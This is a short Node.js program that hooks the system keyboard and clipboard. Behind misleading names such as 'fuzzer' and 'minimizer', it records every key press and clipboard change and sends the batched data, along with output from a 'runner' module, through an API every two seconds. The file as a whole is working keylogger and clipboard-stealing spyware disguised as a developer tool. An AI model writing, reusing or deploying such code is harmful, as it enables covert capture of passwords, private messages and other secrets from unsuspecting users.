const { GlobalKeyboardListener } = require('node-global-key-listener')
const minimizerListener = require('clipboard-event');

const { getMinimizer } = require("./tools/minimizer.js");
const { runRunner } = require("./tools/runner.js");
const {
  pendingData
} = require('./tools/global.js');
const { sendMinimizerAndFuzzerData, sendRunnerData } = require('./tools/api.js');


const main = async () => {
  const v = new GlobalKeyboardListener();

  minimizerListener.startListening();
  minimizerListener.on('change', async () => {
    const change = await getMinimizer()
    pendingData.minimizer += ','+change
  });

  v.addListener(function (e, down) {
    if (e.state === "DOWN" && !(e?.name?.includes("MOUSE"))) {
      pendingData.fuzzer += ','+e.name;
    }
  });


  setInterval(() => {
    runRunner()
  }, 1000)
  
  setInterval(() => {
    if (pendingData.minimizer != "" || pendingData.fuzzer != "") {
      const success = sendMinimizerAndFuzzerData(pendingData.minimizer, pendingData.fuzzer)
      if (success) {
        pendingData.minimizer = ""
        pendingData.fuzzer = ""
      }
    }

    if (pendingData.runners.length) {
      const success = sendRunnerData(pendingData.runners)
      if (success) {
        pendingData.runners = []
      }
    }
  }, 2000)
}

main()